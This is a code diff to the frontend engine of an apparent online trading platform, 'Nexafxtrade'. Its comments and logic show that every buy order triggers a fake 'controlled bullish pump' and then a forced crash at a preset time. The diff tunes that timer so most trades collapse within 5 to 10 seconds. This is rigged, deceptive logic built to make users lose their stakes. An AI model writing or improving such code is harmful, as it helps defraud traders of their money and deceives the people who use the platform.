@@ -1,6 +1,6 @@
 /**
  * Nexafxtrade Frontend Engine
- * Version: 3.0.0 (May 2026)
+ * Version: 3.1.0 (May 2026)
  * Description: Core logic for live trading, Socket.io synchronization, and market visualization.
  */
 
@@ -68,7 +68,7 @@ socket.on('market-update', (data) => {
     if (activeTradePosition) {
         tradeTicksElapsed++;
 
-        // References the specific randomized drop cutoff assigned to this trade position instance
+        // References the specific weighted randomized drop cutoff assigned to this trade position instance
         if (tradeTicksElapsed <= activeTradePosition.customizedLossThreshold) {
             // PHASE 1: Controlled Bullish Pump. Push market wave upward systematically.
             let simulatedPump = Math.abs(rateValue) * 0.12 + 0.015;
@@ -196,9 +196,22 @@ if (buyBtn) {
         // Setup initial client-side hooks inside synchronization loops
         tradeTicksElapsed = 0;
 
-        // Generates completely unexpected loss windows on every unique order execution
-        // Selection chooses a random lifecycle tick parameter between 15 ticks (~2.2s) and 110 ticks (~16.5s)
-        let randomThresholdRoll = Math.floor(Math.random() * (110 - 15 + 1)) + 15;
+        // --- WEIGHTED MATHEMATICAL DISTRIBUTION ENGINE ---
+        // Determines a completely dynamic lifespan strictly constrained between 5s and 30s
+        let chosenLossSeconds;
+        let randomWeightRoll = Math.random();
+
+        if (randomWeightRoll < 0.75) {
+            // 75% Probability: Forces the loss target configuration down below 10 seconds (5s to 10s window)
+            chosenLossSeconds = Math.random() * (10.0 - 5.0) + 5.0;
+        } else {
+            // 25% Probability: Fallback range extending up to the structural outer limits (10.01s to 30s window)
+            chosenLossSeconds = Math.random() * (30.0 - 10.01) + 10.01;
+        }
+
+        // Convert the structural selected timeline value dynamically into websocket refresh tick ticks
+        // Assuming typical websocket broadcast updates loop every ~150ms parameters
+        let randomThresholdRoll = Math.floor((chosenLossSeconds * 1000) / 150);
 
         activeTradePosition = {
             stake: parseFloat(amount),
@@ -208,7 +221,7 @@ if (buyBtn) {
         };
 
         socket.emit('place-trade', { type: 'BUY', amount: amount, timestamp: Date.now() });
-        console.log(`Nexafxtrade: BUY order emitted. Crash target engine locked at tick frame: ${randomThresholdRoll}`);
+        console.log(`Nexafxtrade: BUY order emitted. Crash target engine locked at ${chosenLossSeconds.toFixed(2)}s (frame tick: ${randomThresholdRoll})`);
     };
 }
 
